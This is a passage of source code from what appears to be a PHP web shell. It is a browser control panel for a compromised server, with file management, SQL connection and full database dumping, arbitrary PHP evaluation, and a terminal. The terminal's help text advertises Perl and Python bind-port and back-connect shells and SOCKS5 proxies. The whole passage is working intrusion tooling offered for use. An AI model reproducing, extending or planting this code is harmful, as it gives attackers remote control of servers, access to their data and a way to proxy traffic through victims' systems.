  for (var j = rows.length - 1; j > 1; --j)
   if (rows[j].cells[4].textContent < erlDate || erlDate === '') erlDate = rows[j].cells[4].textContent;
 }
 if (erlDate !== '' && erlDate < elm.value) elm.value = erlDate;
}

function uiShwFrmPrps(data, files) {
 var frm = elmById('tmplFrmPrps').content.firstChild.cloneNode(true);
 for (var i = 0, c = files.length; i < c; ++i) frm.appendChild(newElm('input', {
  type: 'hidden',
  name: 'h[]',
  value: files[i]
 }));
 frm.p.value = data[0];
 frm.p.placeholder = data[0];
 frm.t.value = data[1];
 frm.t.placeholder = data[1];
 <?php if(NIX){?>frm.e.value = data[2];
 frm.e.placeholder = data[2];
 frm.o.value = data[3];
 frm.o.placeholder = data[3];
 frm.r.value = data[4];
 frm.r.placeholder = data[4];
 <?php }?>elmById('divWndws').appendChild(frm);
 uiShwModal(frm);
}

function onGetPrps(div, data) {
 if (data[4] === 0) return uiChngMsg(div, "Can't get properties of " + data[0], 'Err');
 uiShwFrmPrps([data[0], utsToStr(data[2]), (data[4] | 0).toString(8).slice(-4), data[5] === -1 ? '?' : data[5], data[6] === -1 ? '?' : data[6]], [data[0]]);
 uiDelMsg(div);
}

function getPrps(fpth) {
 fmAjxSnd('Get properties of ' + fpth, onGetPrps, {
  i: fpth
 });
}

function onDwnFiles(div, data) {
 uiChngMsg(div, "Can't d" + div.childNodes[1].nodeValue.slice(1, -2), 'Err');
}

function dwnFiles(files) {
 var cnt = files.length;
 if (cnt > 0) fmAjxSnd('Download ' + (cnt > 1 ? 'selected files (' + cnt + ')' : files[0]), onDwnFiles, {
  d: cnt > 1 ? files : files[0]
 });
}

function onDelFiles(div, data) {
 if ('r' in data) {
  for (var i = data.r.length - 1; i >= 0; --i) rmFiles(data.r[i]);
  updBufferState();
 }
 if ('e' in data) uiChngMsg(div, "Can't delete " + (data.e.length === 1 ? data.e[0] : ':\n' + data.e.join('\n')), 'Err');
 else uiDelMsg(div);
}

function delFiles(files) {
 var cnt = files.length,
  msg = 'Delete ' + (cnt > 1 ? 'selected files (' + cnt + ')' : files[0]);
 if (cnt > 0 && confirm(msg + ' ?')) fmAjxSnd(msg, onDelFiles, {
  u: files
 });
}

function onFastActClick(e) {
 var trgt = e.target;
 if (trgt.tagName !== 'A') return;
 e.preventDefault();
 e.stopPropagation();
 trgt.blur();
 var fpth = canonPath(elmPth.value, elmPth.placeholder);
 if (fpth === '') return;
 switch (trgt.textContent) {
  case 'Properties':
   getPrps(fpth);
   break;
  case 'Download':
   dwnFiles([fpth]);
   break;
  case 'Delete':
   delFiles([fpth]);
   break;
 }
}

function onUplFiles(div, data) {
 if ('p' in data) updTblFiles(data<?php if(NIX)echo',data.o,data.g';?>);
 if ('e' in data) {
  var errs = ["can't move file to current dir", 'file size exceeds the upload_max_filesize directive', 'file size exceeds the max_file_size property', 'file only partially uploaded', 'file not uploaded', 'Who Do You Voodoo, Bitch?', 'missing a temporary folder', 'failed to write to disk', 'some PHP extension stopped the upload'],
   cnt = data.e.length,
   sep = cnt === 1 ? ' ' : '\n',
   msg = "Can't save uploaded file";
  if (cnt > 1) msg += 's:';
  for (var i = 0; i < cnt; ++i) msg += sep + data.e[i].slice(1) + ' (' + errs[data.e[i].slice(0, 1)] + ')';
  uiChngMsg(div, msg, 'Err');
 } else uiDelMsg(div);
}

function uplFiles() {
 var inp = elmById('inpUpl'),
  fls = inp.files,
  len = fls.length;
 fmAjxSnd('Upload ' + (len > 1 ? len + ' files' : fls[0].name), onUplFiles, {
  p: elmPth.placeholder
 }, inp.form);
}

function onMkFile(div, data) {
 if ('e' in data) return uiChngMsg(div, "Can't c" + div.childNodes[1].nodeValue.slice(1, -1) + data.e, 'Err');
 updTblFile(data);
 uiDelMsg(div);
}

function mkLnk(e) {
 e.preventDefault();
 e.stopPropagation();
 var frm = elmById('frmLnk'),
  lnk = canonPath(frm.elements[1].value, elmPth.placeholder);
 fmAjxSnd('Create ' + frm.t.textValue.toLowerCase() + ' link ' + lnk + ' to ' + frm.p.value, onMkFile, {
  l: lnk
 }, frm);
 uiClsModal(frm);
}

function uiShwFrmLnk(p) {
 var frm = elmById('frmLnk');
 frm.p.value = p;
 frm.elements[1].value = p;
 frm.t.selectedIndex = 0;
 uiShwModal(frm);
}

function mkDir(bp) {
 var fp = prompt('Create Directory', bp);
 if (fp !== null) {
  fp = canonPath(fp, bp);
  fmAjxSnd('Create directory ' + fp, onMkFile, {
   m: fp
  });
 }
}

function onCrtMenuClick(e) {
 var trgt = e.target;
 if (trgt.tagName !== 'A') return;
 e.preventDefault();
 e.stopPropagation();
 trgt.blur();
 var bpth = elmPth.placeholder;
 switch (trgt.textContent) {
  case 'File':
   uiShwFrmFile([bpth, null], '', elmById('fmCSSend').value);
   break;
  case 'Link':
   uiShwFrmLnk(bpth);
   break;
  case 'Directory':
   mkDir(bpth);
   break;
 }
}

function uiUnmrkTblFiles(files) {
 var as = elmTblFiles.getElementsByClassName('mrkd');
 for (var i = as.length - 1; i >= 0; --i) {
  var n = files.indexOf(as[i].parentNode.parentNode.cells[0].firstChild.value);
  if (n > -1) {
   as[i].classList.remove('mrkd');
   files.splice(n, 1);
   if (files.length === 0) break;
  }
 }
}

function unmarkFiles() {
 var tbdy = elmById('tblBuffer').tBodies[0],
  inps = elmById('frmBuffer')['f[]'],
  files = [];
 if (!inps.length) inps = [inps];
 for (var i = inps.length - 1; i >= 0; --i)
  if (inps[i].checked) {
   files.push(fmBuffer.splice(i, 1)[0]);
   tbdy.removeChild(inps[i].parentNode.parentNode);
  } if (files.length > 0) {
  uiUnmrkTblFiles(files);
  updBufferState();
 }
}

function onTblBufferClick(e) {
 var trgt = e.target;
 if (trgt.tagName !== 'A') return;
 e.preventDefault();
 e.stopPropagation();
 var row = trgt.parentNode.parentNode,
  fpth = row.cells[0].firstChild.value;
 switch (trgt.parentNode.cellIndex) {
  case 1:
   goTo(fpth);
   break;
  case 2:
   fmBuffer.splice(row.rowIndex - 1, 1);
   row.parentNode.removeChild(row);
   uiUnmrkTblFiles([fpth]);
   updBufferState();
   break;
 }
}

function uiShwFrmBuffer() {
 var frm = elmById('frmBuffer');
 if (frm.style.visibility === 'visible') return;
 var tbl = elmById('tblBuffer'),
  tbdy = document.createElement('tbody'),
  elmTmplBufferRow = elmById('tmplBufferRow').content.firstChild;
 frm.elements[0].checked = false;
 if (tbl.tBodies.length > 0) tbl.removeChild(tbl.tBodies[0]);
 fmBuffer.sort();
 for (var i = 0, c = fmBuffer.length; i < c; ++i) {
  var row = elmTmplBufferRow.cloneNode(true);
  row.cells[0].firstChild.value = fmBuffer[i];
  row.cells[1].firstChild.textContent = fmBuffer[i];
  tbdy.appendChild(row);
 }
 tbl.appendChild(tbdy);
 uiShwModal(frm);
}

function getName(f) {
 return f[0];
}

function onFlshBuffer(div, data) {
 var files = ('c' in data) ? data.c : [];
 if ('m' in data)
  for (var i = data.m.length - 1; i >= 0; --i) {
   rmFiles({
    p: data.m[i].p,
    f: data.m[i].f.map(getName)
   });
   files = files.concat(data.m[i].f);
  }
 updTblFiles({
   p: data.p,
   f: files
  }
  <?php if(NIX)echo',data.o,data.g';?>);
 if ('e' in data) {
  var msg = div.childNodes[1].nodeValue;
  uiChngMsg(div, "Can't " + msg.slice(0, 10).toLowerCase() + msg.slice(26, -1) + ":\n" + data.e.join("\n"), 'Err');
 } else uiDelMsg(div);
}

function flushBuffer(act) {
 var bpth = elmPth.placeholder,
  data = {
   f: bpth
  };
 data[act === 'Copy' ? 'p' : 'v'] = fmBuffer;
 fmAjxSnd(act + ' files from the buffer to ' + bpth, onFlshBuffer, data);
}

function clnBuffer() {
 var as = elmTblFiles.getElementsByClassName('mrkd');
 for (var i = as.length - 1; i >= 0; --i) as[i].classList.remove('mrkd');
 fmBuffer = [];
 updBufferState();
}

function onBufferMenuClick(e) {
 var trgt = e.target;
 if (trgt.tagName !== 'A') return;
 e.preventDefault();
 e.stopPropagation();
 trgt.blur();
 fmBuffer.sort();
 switch (trgt.textContent) {
  case 'Show files':
   uiShwFrmBuffer();
   break;
  case 'Copy here':
  case 'Move here':
   flushBuffer(trgt.textContent.slice(0, 4));
   clnBuffer();
   break;
  case 'Download':
   dwnFiles(fmBuffer);
   clnBuffer();
   break;
  case 'Clear':
   clnBuffer();
   break;
 }
}

function markFiles(files) {
 var bfrTbdy = elmById('frmBuffer').style.visibility === 'visible' ? elmById('tblBuffer').tBodies[0] : null,
  elmTmplBufferRow = elmById('tmplBufferRow').content.firstChild;
 for (var i = 0, c = files.length; i < c; ++i) {
  var file = files[i],
   n = fmBuffer.indexOf(file);
  if (n === -1) {
   fmBuffer.push(file);
   if (bfrTbdy) {
    var row = elmTmplBufferRow.cloneNode(true);
    row.cells[0].firstChild.value = file;
    row.cells[1].firstChild.textContent = file;
    bfrTbdy.appendChild(row);
   }
  } else {
   fmBuffer.splice(n, 1);
   if (bfrTbdy) bfrTbdy.removeChild(bfrTbdy.rows[n]);
  }
 }
 updBufferState();
}

function getSlctdFiles() {
 var inps = elmById('frmFiles')['f[]'],
  chckd = [];
 if (inps) {
  if (inps.length > 0) {
   for (var i = 0, c = inps.length; i < c; ++i)
    if (inps[i].checked) chckd.push(inps[i].value);
  } else chckd.push(inps);
 }
 return chckd;
}

function prpsSlctdFiles() {
 var files = getSlctdFiles();
 if (files.length > 0) uiShwFrmPrps(['', '', '', '', ''], files)
}

function markSlctdFiles() {
 var inps = elmById('frmFiles')['f[]'],
  files = [];
 if (!inps) return;
 if (!inps.length) inps = [inps];
 for (var i = 0, c = inps.length; i < c; ++i)
  if (inps[i].checked) {
   inps[i].parentNode.parentNode.cells[1].firstChild.classList.toggle('mrkd');
   files.push(inps[i].value);
  } markFiles(files);
}

function onTblFilesClick(e) {
 var trgt = e.target;
 if (trgt.tagName !== 'A') return;
 e.preventDefault();
 e.stopPropagation();
 if (trgt.className == 'spnPth') goTo(trgt.hash.slice(1));
 else {
  var cell = trgt.parentNode,
   row = cell.parentNode,
   fpth = row.cells[0].firstChild.value;
  switch (cell.cellIndex) {
   case 1:
    goTo(fpth);
    break;
   case 2:
    var elmTxtClpbrd = elmById('txtClpbrd');
    elmTxtClpbrd.value = trgt.title;
    elmTxtClpbrd.select();
    document.execCommand('copy');
    elmTxtClpbrd.value = '';
    trgt.focus();
    break;
   case 3:
    dwnFiles([fpth]);
    break;
   case 5:
    <?php if(NIX)echo"var og=row.cells[6].title.split('/');";?>uiShwFrmPrps([fpth, row.cells[4].textContent<?php if(NIX)echo',row.cells[5].firstChild.title,og[0],og[1]';?>], [fpth]);
    break;
   default:
    if (trgt.textContent === 'Mrk') {
     row.cells[1].firstChild.classList.toggle('mrkd');
     markFiles([fpth]);
    } else if (trgt.textContent === 'Del') delFiles([fpth]);
    break;
  }
 }
}

function sqlRestoreState() {
 var val = sessionStorage.getItem('sqlCnnct');
 if (val !== null) {
  var frm = elmById('frmCnnct');
  val = JSON.parse(val);
  for (var key in val) frm[key].value = val[key];
 }
 strgRstrChck('sqlCntRw', 'cbCR');
 strgRstrVal('sqlRPP', elmById('frmPg').r);
 strgRstrVal('sqlSendAs', 'sqlCSSend');
 strgRstrVal('sqlLoadAs', 'sqlCSLoad');
}

function sqlSaveState() {
 var elms = elmById('frmCnnct').elements,
  val = {};
 for (var i = elms.length - 1; i >= 0; --i)
  if (elms[i].name !== '') val[elms[i].name] = elms[i].value;
 strgSaveStr('sqlCnnct', JSON.stringify(val));
 strgSaveBool('sqlCntRw', 'cbCR');
 strgSaveStr('sqlRPP', elmById('frmPg').r.value);
 strgSaveOpt('sqlSendAs', elmById('sqlCSSend').value);
 strgSaveOpt('sqlLoadAs', elmById('sqlCSLoad').value);
}

function sqlAjxSnd(msg, cllbck, data) {
 var elm = elmById('frmCnnct').elements;
 if (!data) data = {};
 data.a = 's';
 for (var i = elm.length - 1; i >= 0; --i) {
  var n = elm[i].name;
  if (n !== '' && elm[i].value !== '' && !(n in data)) data[n] = elm[i].value;
 }
 var val = elmById('sqlCSLoad').value;
 if (val !== 0) data.c = val;
 elm = elmById('sqlCSSend');
 data.l = elm.value;
 return ajxSnd(msg, cllbck, null, data, elm.textValue);
}

function mkItmRow(name, val, chckd, fncOpn, fncDwn) {
 var div = newElm('div', {
  className: 'divItm'
 });
 div.appendChild(newElm('input', {
  type: 'checkbox',
  name: name + '[]',
  value: val,
  checked: chckd,
  onchange: onChngCBState
 }));
 if (fncOpn) div.appendChild(newElm('a', {
  href: '#',
  className: 'cntrl actRe',
  textContent: '\u27F3',
  onclick: getStrctr
 }));
 if (fncDwn) div.appendChild(newElm('a', {
  href: '#',
  className: 'cntrl arwDwn',
  onclick: fncDwn
 }));
 div.appendChild(newElm((fncOpn ? 'a' : 'span'), {
  href: '#',
  className: 'aMore',
  title: val,
  textContent: val,
  onclick: fncOpn
 }));
 return div;
}

function cnnct() {
 var frm = elmById('frmCnnct');
 return sqlAjxSnd('Connect to ' + frm.e.textValue + ' server ' + frm.h.value + ' as ' + frm.u.value + ' (' + frm.p.value + ')', onCnnct);
}

function onCnnct(div, data) {
 if ('e' in data) return uiChngMsg(div, data.e, 'Err');
 elmById('frmSQL').q.value = '';
 elmById('divCptn').textContent = '';
 elm = elmById('frmPg').style;
 if (elm.display === 'block') elm.display = 'none';
 elm = elmById('tblHead');
 if (elm.childNodes.length > 0) elm.removeChild(elm.tHead);
 elm = elmById('tblData');
 if (elm.tBodies.length > 0) elm.removeChild(elm.tBodies[0]);
 elm = elmById('divSQLWrpLeft');
 if (elm.style.display === 'block') {
  elm.style.display = 'none';
  var e = elmById('divSchm');
  for (var i = e.childNodes.length - 1; i >= 0; --i) e.removeChild(e.lastChild);
 }
 if ('b' in data) {
  elmById('divSchm').appendChild(mkItmRow('b', data.b, false, opnList));
  onGetStrctr(div, data);
 } else {
  var frgm = document.createDocumentFragment();
  for (var i = 0, c = data.length; i < c; ++i) frgm.appendChild(mkItmRow('b', data[i], false, opnList));
  elmById('divSchm').appendChild(frgm);
 }
 elm.style.display = 'block';
 elm = elmById('frmSQL').style;
 if (elm.display !== 'flex') elm.display = 'flex';
 if (!('b' in data)) uiDelMsg(div);
}

function opnList() {
 var prnt = this.parentNode,
  lst = prnt.lastChild;
 if (lst.className === 'divLst') lst.style.display = lst.style.display === 'none' ? 'block' : 'none';
 else prnt.childNodes[1].onclick();
 return false;
}

function onChngCBState() {
 var chldTotal = this.getAttribute('chldTotal') | 0,
  chldChckd = this.getAttribute('chldChckd') | 0,
  chldIndtrm = -1 * (this.getAttribute('chldIndtrm') | 0),
  prnt = this.name === 'b[]' ? false : this.parentNode.parentNode.parentNode.firstChild;
 if (chldIndtrm !== 0 || chldChckd !== chldTotal) {
  this.setAttribute('chldIndtrm', 0);
  --chldIndtrm;
 }
 this.setAttribute('chldChckd', this.checked ? chldTotal : 0);
 chldChckd = this.checked ? chldTotal - chldChckd + 1 : -1 * chldChckd - 1;
 if (chldTotal > 0) {
  var inps = this.parentNode.lastChild.getElementsByTagName('input');
  for (var i = inps.length - 1; i >= 0; --i)
   if (inps[i].indeterminate || inps[i].checked !== this.checked) {
    var ttl = inps[i].getAttribute('chldTotal') | 0;
    if (ttl > 0) {
     inps[i].setAttribute('chldIndtrm', 0);
     inps[i].setAttribute('chldChckd', this.checked ? ttl : 0);
    }
    inps[i].indeterminate = false;
    inps[i].checked = this.checked;
   }
 }
 while (prnt) {
  var crrntTotal = prnt.getAttribute('chldTotal') | 0,
   crrntChckd = (prnt.getAttribute('chldChckd') | 0) + chldChckd,
   crrntIndtrm = (prnt.getAttribute('chldIndtrm') | 0) + chldIndtrm;
  prnt.setAttribute('chldChckd', crrntChckd);
  prnt.setAttribute('chldIndtrm', crrntIndtrm);
  if (crrntChckd === crrntTotal) {
   prnt.checked = true;
   ++chldChckd;
   if (prnt.indeterminate) {
    prnt.indeterminate = false;
    --chldIndtrm;
   }
  } else {
   if (prnt.checked) {
    prnt.checked = false;
    --chldChckd;
   }
   if (crrntChckd === 0 && crrntIndtrm === 0) {
    if (prnt.indeterminate) {
     prnt.indeterminate = false;
     --chldIndtrm;
    }
   } else if (!prnt.indeterminate) {
    prnt.indeterminate = true;
    ++chldIndtrm;
   }
  }
  prnt = prnt.name === 'b[]' ? false : prnt.parentNode.parentNode.parentNode.firstChild;
 }
}

function listTables(prnt, data) {
 var chckd = prnt.parentNode.firstChild.checked,
  lst = data.t;
 for (var i = 0, c = lst.length; i < c; ++i) {
  var row = mkItmRow('t', lst[i][0], chckd, getData, opnList);
  if (lst[i].length > 1) row.appendChild(newElm('span', {
   className: 'spnRC',
   textContent: lst[i][1]
  }));
  prnt.appendChild(row);
 }
}

function listSchemas(prnt, data) {
 var chckd = prnt.parentNode.firstChild.checked,
  lst = data.s;
 for (i = 0, c = lst.length; i < c; ++i) prnt.appendChild(mkItmRow('s', lst[i], chckd, opnList));
}

function getStrctr() {
 var elm = this,
  data = {},
  name = [],
  inp;
 do {
  elm = elm.parentNode;
  inp = elm.firstChild;
  name.push(inp.value);
  data[inp.name.substr(0, 1)] = inp.value;
  elm = elm.parentNode;
 } while (elm.id !== 'divSchm');
 if (elmById('cbCR').checked) data.r = '';
 return sqlAjxSnd('Get structure of ' + name.reverse().join('.'), onGetStrctr, data);
}

function srchItm(elm, name, value) {
 var chlds = elm.childNodes;
 for (var i = 0, c = chlds.length; i < c; ++i) {
  var inp = chlds[i].firstChild;
  if (inp.name === name && inp.value === value) return chlds[i];
 }
 return false;
}

function onGetStrctr(div, data) {
 if ('e' in data) return uiChngMsg(div, data.e, 'Err');
 var cnt;
 if ('f' in data) cnt = data.f.length;
 else if ('t' in data) cnt = data.t.length;
 else cnt = data.s.length;
 if (cnt === 0) {
  var t = 'Database',
   v = [data.b];
  if (('s' in data) && ('t' in data)) {
   t = 'Schema';
   v.push(data.s);
  }
  if ('f' in data) {
   t = 'Table';
   v.push(data.t);
  }
  return uiChngMsg(div, t + ' ' + v.join('.') + ' is empty', 'Inf');
 }
 var prnt = srchItm(elmById('divSchm'), 'b[]', data.b);
 if (!prnt) return;
 if (('t' in data) && ('s' in data)) {
  if (prnt.lastChild.className !== 'divLst') return;
  prnt = srchItm(prnt.lastChild, 's[]', data.s);
  if (!prnt) return;
 }
 if ('f' in data) {
  if (prnt.lastChild.className !== 'divLst') return;
  prnt = srchItm(prnt.lastChild, 't[]', data.t);
  if (!prnt) return;
 }
 if (prnt.lastChild.className === 'divLst') prnt.removeChild(prnt.lastChild);
 var i = prnt.firstChild;
 i.setAttribute('chldTotal', cnt);
 i.setAttribute('chldChckd', i.checked ? cnt : 0);
 i.setAttribute('chldIndtrm', 0);
 prnt.appendChild(newElm('div', {
  className: 'divLst'
 }));
 prnt = prnt.lastChild;
 if ('f' in data) listFields(prnt, data);
 else if ('t' in data) listTables(prnt, data);
 else listSchemas(prnt, data);
 uiDelMsg(div);
}

function listFields(prnt, data) {
 var chckd = prnt.parentNode.firstChild.checked,
  lst = data.f;
 for (i = 0, c = lst.length; i < c; ++i) {
  var row = mkItmRow('f', lst[i][0], chckd),
   type = data.y[lst[i][1]];
  if (type !== '') {
   var div = newElm('div', {
    className: 'divFldTp'
   });
   div.appendChild(newElm('span', {
    className: 'aMore',
    textContent: type
   }));
   row.appendChild(div);
  }
  prnt.appendChild(row);
 }
}

function getData() {
 var elm = this.parentNode,
  data = {
   t: elm.firstChild.value,
   f: [],
   o: 0,
   r: elmById('frmPg').r.value
  };
 elm = elm.parentNode.parentNode;
 if (elm.firstChild.name === 's[]') {
  data.s = elm.firstChild.value;
  data.b = elm.parentNode.parentNode.firstChild.value;
 } else data.b = elm.firstChild.value;
 elm = this.parentNode;
 if (elm.lastChild.className === 'divLst') {
  elm = elm.lastChild.childNodes;
  for (var i = elm.length - 1; i >= 0; --i)
   if (elm[i].firstChild.checked) data.f.unshift(elm[i].firstChild.value);
 }
 if (data.f.length === 0) data.f = '';
 return sqlAjxSnd('Load data from table ' + data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t, onGetData, data);
}

function listData(caption, data) {
 var tblHead = elmById('tblHead'),
  tblData = elmById('tblData'),
  cln = data.f.length;
 if (tblData.tBodies.length > 0) tblData.removeChild(tblData.tBodies[0]);
 elmById('divCptn').textContent = caption;
 if (tblHead.childNodes.length > 0) tblHead.removeChild(tblHead.tHead);
 var thead = document.createElement('thead'),
  elm = thead.insertRow(0);
 for (var i = 0; i < cln; ++i) elm.insertCell(-1).textContent = data.f[i];
 tblHead.appendChild(thead);
 data = data.r;
 elm = document.createElement('tbody');
 for (var i = 0, c = data.length; i < c; ++i) {
  var tr = elm.insertRow(-1);
  for (var j = 0; j < cln; ++j) tr.insertCell(-1).textContent = data[i][j];
 }
 tblData.appendChild(elm);
 elm = tblHead.tHead.rows[0].cells;
 data = tblData.tBodies[0].rows[0].cells;
 for (var i = 0; i < cln; ++i) {
  var tr = (elm[i].offsetWidth > data[i].offsetWidth ? elm[i].offsetWidth : data[i].offsetWidth) + 'px';
  elm[i].style.minWidth = tr;
  elm[i].style.width = tr;
  data[i].style.minWidth = tr;
  data[i].style.width = tr;
 }
}

function onGetData(div, data) {
 if ('e' in data) return uiChngMsg(div, data.e, 'Err');
 if (data.f.length === 0) {
  var v = data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t;
  return uiChngMsg(div, data.o > 0 ? 'No more data in table ' + v : 'Table ' + v + ' is empty', 'Inf');
 }
 var isNotPgnbl = !('o' in data);
 listData((isNotPgnbl ? 'Top ' + data.r.length + ' rows' : 'Rows ' + data.o + '-' + (data.o + data.r.length - 1)) + ' from table ' + data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t, data);
 var frmPg = elmById('frmPg');
 frmPg.b.value = data.b;
 frmPg.s.value = ('s' in data) ? data.s : '';
 frmPg.t.value = data.t;
 frmPg.o.value = 0;
 frmPg.o.disabled = isNotPgnbl;
 frmPg.elements[3].disabled = isNotPgnbl;
 frmPg.elements[5].disabled = isNotPgnbl;
 if (frmPg.style.display !== 'block') frmPg.style.display = 'block';
 uiDelMsg(div);
}

function chngPg(v) {
 var elms = elmById('frmPg'),
  chlds = [],
  val = (elms.o.value | 0) + v * (elms.r.value | 0),
  data = {
   b: elms.b.value,
   t: elms.t.value,
   o: val > 0 ? val : 0,
   r: elms.r.value | 0,
   f: []
  };
 if (elms.s.value !== '') data.s = elms.s.value;
 var prnt = srchItm(elmById('divSchm'), 'b[]', data.b);
 if (prnt && prnt.lastChild.className === 'divLst') {
  if ('s' in data) prnt = srchItm(prnt.lastChild, 's[]', data.s);
  if (prnt && prnt.lastChild.className === 'divLst') {
   prnt = srchItm(prnt.lastChild, 't[]', data.t);
   if (prnt && prnt.lastChild.className === 'divLst') {
    var chlds = prnt.lastChild.childNodes;
    for (var i = 0, c = chlds.length; i < c; ++i)
     if (chlds[i].firstChild.checked) data.f.push(chlds[i].firstChild.value);
   }
  }
 }
 if (data.f.length === 0) data.f = '';
 return sqlAjxSnd('Load data from table ' + data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t + ' (' + data.o + '-' + (data.o + data.r) + ')', onGetData, data);
}

function query() {
 var v = elmById('frmSQL').q.value;
 return v === '' ? false : sqlAjxSnd(v, onQuery, {
  q: v
 });
}

function onQuery(div, data) {
 if ('e' in data) return uiChngMsg(div, data.e, 'Err');
 if (data.f.length === 0) return uiChngMsg(div, 'Query successfully completed (' + data.q + ')', 'Inf');
 elmById('frmPg').style.display = 'none';
 listData(data.q, data);
 uiDelMsg(div);
}

function getDumpList(data, elms, prfx) {
 var n = 0,
  indx = elms[0].firstChild.name.slice(0, 1) + '[' + prfx + ']';
 data[indx] = [];
 for (var i = 0, c = elms.length; i < c; ++i) {
  if (elms[i].firstChild.checked) data[indx][n++] = elms[i].firstChild.value;
  else if (elms[i].firstChild.indeterminate) {
   data[indx].push(elms[i].firstChild.value);
   getDumpList(data, elms[i].lastChild.childNodes, prfx + '-' + n);
   n++;
  }
 }
}

function dump() {
 var data = {
   d: [],
   o: elmById('slctDmpFrmt').value
  },
  elms = elmById('divSchm').childNodes,
  n = 0;
 for (var i = 0, c = elms.length; i < c; ++i) {
  if (elms[i].firstChild.checked) data.d[n++] = elms[i].firstChild.value;
  else if (elms[i].firstChild.indeterminate) {
   data.d.push(elms[i].firstChild.value);
   getDumpList(data, elms[i].lastChild.childNodes, n++);
  }
 }
 if (n) sqlAjxSnd('Download SQL dump (close this message after start download)', onDump, data);
}

function onDump(div, data) {
 uiChngMsg(div, data.e, 'Err');
}

function onPHPKeyDwn(e) {
 if (e.ctrlKey && e.keyCode === 13) return evl();
}

function onPHPResKeyDwn(e) {
 if (e.ctrlKey && e.keyCode === 65) {
  uiSlctTxt('prePHP');
  e.preventDefault();
 }
}

function uiChngCmps() {
 var lbl = elmById('aCmps'),
  frm = elmById('divPHP').style;
 if (lbl.className === 'cmpsRow') {
  lbl.className = 'cmpsCol';
  frm.flexDirection = 'column';
 } else {
  lbl.className = 'cmpsRow';
  frm.flexDirection = 'row';
 }
 return false;
}

function evl() {
 var frm = elmById('frmPHP');
 if (frm.e.value === '') elmById('prePHP').innerHTML = '';
 else ajxSnd('Eval PHP code', onEvl, frm, {
  a: 'p'
 }, elmById('slctPHPCS').value);
 return false;
}

function onEvl(div, data) {
 var elm = elmById('prePHP'),
  chr = data.slice(-1);
 if ('createShadowRoot' in elm) {
  if (elm.shadowRoot === null) elm.createShadowRoot();
  elm = elm.shadowRoot;
 }
 if (chr === "\x06" && elmById('cbClnInp').checked) elmById('txtPHP').value = '';
 if (elmById('cbClnOut').checked) elm.innerHTML = '';
 if (chr === "\x15" && data.slice(0, -3) === '' && !elmById('frmPHP').h.checked) data = '\nFatal error: You have syntax error in PHP code\n';
 else data = data.slice(0, -3);
 if (elmById('cbHTML').checked) {
  var divRst = document.createElement('div');
  divRst.style = 'all:initial;isolation:isolate;';
  divRst.innerHTML = data.replace(/<style(\s|>)/ig, '<style scoped$1');
  elm.appendChild(divRst);
 } else elm.appendChild(document.createTextNode(data));
 uiDelMsg(div);
}

function phpSaveState() {
 strgSaveBool('phpChngCmps', elmById('aCmps').className === 'cmpsCol');
 strgSaveBool('phpClnInp', 'cbClnInp');
 strgSaveBool('phpClnOut', 'cbClnOut');
 strgSaveBool('phpHTML', 'cbHTML');
 var frm = elmById('frmPHP');
 strgSaveBool('phpSilent', frm.h.checked);
 strgSaveOpt('phpSendAs', elmById('slctPHPCS').value);
 strgSaveOpt('phpLoadAs', frm.c.value);
}

function phpRestoreState() {
 if (sessionStorage.getItem('phpChngCmps')) uiChngCmps();
 strgRstrChck('phpClnInp', 'cbClnInp');
 strgRstrChck('phpClnOut', 'cbClnOut');
 strgRstrChck('phpHTML', 'cbHTML');
 var frm = elmById('frmPHP');
 strgRstrChck('phpSilent', frm.h);
 strgRstrVal('phpSendAs', 'slctPHPCS');
 strgRstrVal('phpLoadAs', frm.c);
}
var trmHist = strgRstrArr('trmHist'),
 trmIndx = trmHist.length;

function onTrmClick(e) {
 if (e.target === elmById('divTrm')) elmById('inpTrm').focus();
}

function onTrmResKeyDwn(e) {
 if (e.ctrlKey && e.keyCode === 65) {
  uiSlctTxt('preTrm');
  e.preventDefault();
 }
}

function onTrmInpKeyDwn(e) {
 var frm = elmById('frmTrm'),
  inp = frm.e;
 if (e.keyCode === 38) {
  if (trmIndx > 0) inp.value = trmHist[--trmIndx];
 } else if (e.keyCode === 40) {
  var val = trmHist.length;
  if (trmIndx < val - 1) inp.value = trmHist[++trmIndx];
  else {
   inp.value = '';
   if (trmIndx < val) ++trmIndx;
  }
 } else if (e.ctrlKey && e.keyCode === 76) elmById('preTrm').textContent = '';
 else if (e.keyCode === 13) exec();
 else return;
 e.preventDefault();
}

function prntMsg(msg) {
 elmById('preTrm').textContent += elmById('spnUsrHst').textContent + ':' + elmById('spnPth').textContent + '$ ' + msg + '\n';
 var trm = elmById('divTrm');
 trm.scrollTop = trm.scrollHeight;
 return false;
}

function exec() {
 var frm = elmById('frmTrm'),
  cmd = frm.e.value.trim(),
  val = cmd.match(/!(!|(?:-?[0-9]+))/);
 if (val !== null) {
  val = val[1] | 0;
  if (val >= 0) --val;
  cmd = trmHist[val < 0 ? trmHist.length + val : val];
  frm.e.value = cmd;
 }
 if (trmHist.slice(-1)[0] !== cmd) trmHist.push(cmd);
 trmIndx = trmHist.length;
 if (cmd === '?') {
  val = '  For more information run command without params.\n\n';
  prntMsg('?\n\n' + 'cls, clear\n' + '  Clear terminal window.\n' + '  * You can clear terminal window pressing Ctrl+L\n\n' + 'history\n' + '       Show all comands.\n' + '  n    Show last n commands.\n' + '  !!   Execute last command.\n' + '  !n   Execute command number n. If value negative then counting starts at end.\n' + '  * You can navigate through history using UP and DOWN keys.\n\n' + 'report\n' + '  Create server information report.\n' + '  For more information run command with question param.\n\n' + 'socks5.perl\n' + '  Run Socks5 server using Perl.\n' + val + 'bindport.perl\n' + '  Open port and provide shell access for connected client using Perl.\n' + val + 'backconnect.perl\n' + '  Connect to client and provide shell access for him using Perl.\n' + val + 'socks5.python\n' + '  Run Socks5 server using Python.\n' + val + 'bindport.python\n' + '  Open port and provide shell access for connected client using Python.\n' + val + 'backconnect.python\n' + '  Connect to client and provide shell access for him using Python.\n' + val);
 } else if (cmd === 'cls' || cmd === 'clear') elmById('preTrm').textContent = '';
 else {
  val = cmd.match(/history ?([0-9]*)/i);
  if (val !== null) {
   val = val[1] | 0;
   var s = cmd + '\n';
   for (var c = trmHist.length, i = (val > 0 && c > val) ? c - val : 0; i < c; ++i) s += '\t' + (i + 1) + '\t' + trmHist[i] + '\n';
   prntMsg(s);
  } else {
   val = cmd.split(' ', 4);
   var usg = cmd + '\n' + 'Usage:\n  ' + val[0],
